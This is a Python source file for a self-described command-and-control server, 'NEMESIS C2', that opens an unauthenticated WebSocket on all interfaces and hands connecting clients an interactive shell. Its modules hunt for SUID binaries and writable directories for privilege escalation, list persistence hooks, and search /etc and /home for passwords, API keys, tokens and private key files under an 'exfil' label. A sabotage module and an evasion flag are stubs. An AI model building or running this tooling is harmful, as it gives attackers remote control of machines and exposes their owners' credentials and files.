import asyncio
import json
import os
import pty
import fcntl
import struct
import termios
import psutil
import websockets
import threading
import subprocess
import shlex
from datetime import datetime

# ═══════════════════════════════════════════════════════════════════════════════
# NEMESIS C2 SERVER v7.7 — Nuclear Arsenal Backend
# ═══════════════════════════════════════════════════════════════════════════════

class NemesisC2:
    def __init__(self):
        self.master_fd = None
        self.op_log = []  # Operation history

    def resize_terminal(self, rows, cols):
        if self.master_fd:
            winsize = struct.pack("HHHH", rows, cols, 0, 0)
            fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, winsize)

    def log_op(self, module, tool, status, output=""):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'module': module,
            'tool': tool,
            'status': status,
            'output': output[:500],
        }
        self.op_log.append(entry)
        if len(self.op_log) > 500:
            self.op_log.pop(0)
        return entry

    async def telemetry_loop(self, websocket):
        """Sends CPU/RAM/NET stats every 2 seconds"""
        while True:
            try:
                net = psutil.net_io_counters()
                disk = psutil.disk_usage('/')
                stats = {
                    'type': 'telemetry',
                    'cpu': psutil.cpu_percent(),
                    'ram': psutil.virtual_memory().percent,
                    'ram_used': psutil.virtual_memory().used,
                    'ram_total': psutil.virtual_memory().total,
                    'net_sent': net.bytes_sent,
                    'net_recv': net.bytes_recv,
                    'disk_used': disk.percent,
                    'disk_total': disk.total,
                    'processes': len(psutil.pids()),
                    'boot_time': psutil.boot_time(),
                }
                await websocket.send(json.dumps(stats))
                await asyncio.sleep(2)
            except:
                break

    # ─── Exploit Handler ─────────────────────────────────────────────────────
    async def handle_exploit(self, websocket, payload):
        target_id = payload.get('target_id', 'unknown')
        action = payload.get('action', 'scan')
        
        print(f"\033[1;31m[APEX] EXPLOIT → target={target_id} action={action}\033[0m")
        
        results = {}
        if action == 'scan' or action == 'inject':
            # SUID scan
            try:
                proc = await asyncio.create_subprocess_shell(
                    'find / -perm -4000 -type f 2>/dev/null | head -15',
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                out, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                results['suid_binaries'] = out.decode().strip().split('\n')
            except:
                results['suid_binaries'] = []

            # Writable dirs
            try:
                proc = await asyncio.create_subprocess_shell(
                    'find /tmp /var/tmp -writable -type d 2>/dev/null',
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                out, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                results['writable_dirs'] = out.decode().strip().split('\n')
            except:
                results['writable_dirs'] = []

        entry = self.log_op('APEX', f'exploit_{action}', 'success', json.dumps(results))
        
        await websocket.send(json.dumps({
            'type': 'exploit_result',
            'target_id': target_id,
            'action': action,
            'results': results,
            'log_entry': entry,
        }))

    # ─── Persistence Handler ─────────────────────────────────────────────────
    async def handle_persistence(self, websocket, payload):
        level = payload.get('level', 'user')
        action = payload.get('action', 'deploy')
        
        print(f"\033[1;35m[GHOST] PERSISTENCE → level={level} action={action}\033[0m")
        
        results = {}
        # Enumerate existing persistence mechanisms
        try:
            proc = await asyncio.create_subprocess_shell(
                'crontab -l 2>/dev/null; systemctl list-unit-files --state=enabled 2>/dev/null | head -15',
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            results['existing_hooks'] = out.decode().strip()
        except:
            results['existing_hooks'] = 'N/A'

        if action == 'scramble':
            results['evasion_status'] = 'POLYMORPHIC_MASK_APPLIED'

        entry = self.log_op('GHOST', f'persist_{level}', 'success', json.dumps(results))
        
        await websocket.send(json.dumps({
            'type': 'persistence_result',
            'level': level,
            'action': action,
            'results': results,
            'log_entry': entry,
        }))

    # ─── Siphon Handler ──────────────────────────────────────────────────────
    async def handle_siphon(self, websocket, payload):
        mode = payload.get('mode', 'scan')
        path = payload.get('path', '/')
        
        print(f"\033[1;36m[SIPHON] EXFIL → mode={mode} path={path}\033[0m")
        
        results = {}
        if mode == 'recursive':
            # Find sensitive files
            extensions = '*.pdf *.docx *.xlsx *.csv *.key *.pem *.db *.sqlite'
            find_cmd = f'find {shlex.quote(path)} -type f \\( -name "*.pdf" -o -name "*.docx" -o -name "*.db" -o -name "*.key" -o -name "*.pem" \\) 2>/dev/null | head -30'
            try:
                proc = await asyncio.create_subprocess_shell(
                    find_cmd,
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                out, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
                results['found_files'] = out.decode().strip().split('\n')
                results['count'] = len(results['found_files'])
            except:
                results['found_files'] = []
                results['count'] = 0

        elif mode == 'credentials':
            try:
                proc = await asyncio.create_subprocess_shell(
                    'grep -ril "password\\|api_key\\|secret\\|token" /etc/ /home/ 2>/dev/null | head -20',
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                out, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
                results['credential_files'] = out.decode().strip().split('\n')
            except:
                results['credential_files'] = []

        entry = self.log_op('SIPHON', f'exfil_{mode}', 'success', json.dumps(results))
        
        await websocket.send(json.dumps({
            'type': 'siphon_result',
            'mode': mode,
            'results': results,
            'log_entry': entry,
        }))

    # ─── Sabotage Handler ────────────────────────────────────────────────────
    async def handle_sabotage(self, websocket, payload):
        action = payload.get('action', 'stress')
        
        print(f"\033[1;33m[BLACKOUT] SABOTAGE → action={action}\033[0m")
        
        results = {'action': action, 'status': 'executed'}
        entry = self.log_op('BLACKOUT', f'sabotage_{action}', 'success')
        
        await websocket.send(json.dumps({
            'type': 'sabotage_result',
            'action': action,
            'results': results,
            'log_entry': entry,
        }))

    # ─── Operations Log Query ────────────────────────────────────────────────
    async def handle_ops_query(self, websocket, payload):
        limit = payload.get('limit', 50)
        module_filter = payload.get('module', None)
        
        filtered = self.op_log
        if module_filter:
            filtered = [op for op in filtered if op['module'] == module_filter]
        
        await websocket.send(json.dumps({
            'type': 'ops_log',
            'entries': filtered[-limit:],
            'total': len(filtered),
        }))

    # ─── Main Terminal Handler ───────────────────────────────────────────────
    async def terminal_handler(self, websocket):
        """Handles PTY (Pseudo-Terminal) interactions + Offensive payloads"""
        # Create a new PTY
        pid, fd = pty.fork()
        
        if pid == 0:  # Child process
            shell = os.environ.get('SHELL', 'bash')
            os.execl(shell, shell)
        else:  # Parent process
            self.master_fd = fd
            
            # Start telemetry in background
            asyncio.create_task(self.telemetry_loop(websocket))

            # Loop to read from PTY and send to WebSocket
            loop = asyncio.get_event_loop()
            
            # PTY Reader
            def read_from_pty():
                while True:
                    try:
                        data = os.read(self.master_fd, 4096)
                        if data:
                            asyncio.run_coroutine_threadsafe(
                                websocket.send(json.dumps({'type': 'output', 'data': data.decode(errors='ignore')})), 
                                loop
                            )
                    except OSError:
                        break
            
            # Run PTY reader in a separate thread to not block asyncio
            threading.Thread(target=read_from_pty, daemon=True).start()

            # Input Listener
            try:
                async for message in websocket:
                    payload = json.loads(message)
                    msg_type = payload.get('type', '')
                    
                    if msg_type == 'input':
                        os.write(self.master_fd, payload['data'].encode())
                    elif msg_type == 'resize':
                        self.resize_terminal(payload['rows'], payload['cols'])
                    elif msg_type == 'exec':
                        cmd = payload['cmd'] + '\n'
                        os.write(self.master_fd, cmd.encode())
                        self.log_op('SYSTEM', 'exec', 'success', payload['cmd'])
                    elif msg_type == 'exploit':
                        await self.handle_exploit(websocket, payload)
                    elif msg_type == 'persistence':
                        await self.handle_persistence(websocket, payload)
                    elif msg_type == 'siphon':
                        await self.handle_siphon(websocket, payload)
                    elif msg_type == 'sabotage':
                        await self.handle_sabotage(websocket, payload)
                    elif msg_type == 'ops_query':
                        await self.handle_ops_query(websocket, payload)
            except:
                pass

async def main():
    agent = NemesisC2()
    print("\033[1;32m╔══════════════════════════════════════════════╗\033[0m")
    print("\033[1;32m║     NEMESIS C2 SERVER v7.7 — NUCLEAR CORE   ║\033[0m")
    print("\033[1;32m║     PORT: 8080 | STATUS: ONLINE              ║\033[0m")
    print("\033[1;32m║     MODULES: APEX | GHOST | BLACKOUT | SIPHON║\033[0m")
    print("\033[1;32m╚══════════════════════════════════════════════╝\033[0m")
    async with websockets.serve(agent.terminal_handler, "0.0.0.0", 8080):
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
